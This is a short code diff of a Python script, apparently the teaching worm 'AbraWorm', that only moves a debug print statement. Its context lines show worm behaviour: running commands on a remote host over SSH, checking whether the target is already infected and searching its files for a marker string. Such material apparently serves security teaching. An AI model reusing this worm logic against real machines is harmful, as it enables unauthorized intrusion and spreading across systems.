@@ -99,7 +99,6 @@ while True:
                         print(error)
                     received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
                     print("\n\noutput of 'ls' command: %s" % str(received_list))
-                    print("Debug")
                     
                     if ''.join(received_list).find('AbraWorm') >= 0: 
                         print("\nThe target machine is already infected\n")      
@@ -108,6 +107,7 @@ while True:
                     # Now let's look for files that contain the string 'abracadabra'
                     cmd = 'grep -ls abracadabra *'
                     stdin, stdout, stderr = ssh.exec_command(cmd)
+                    print("Debug")
                     error = stderr.readlines()
                     if error:
                         print('Error in executing command: %s' %cmd) 
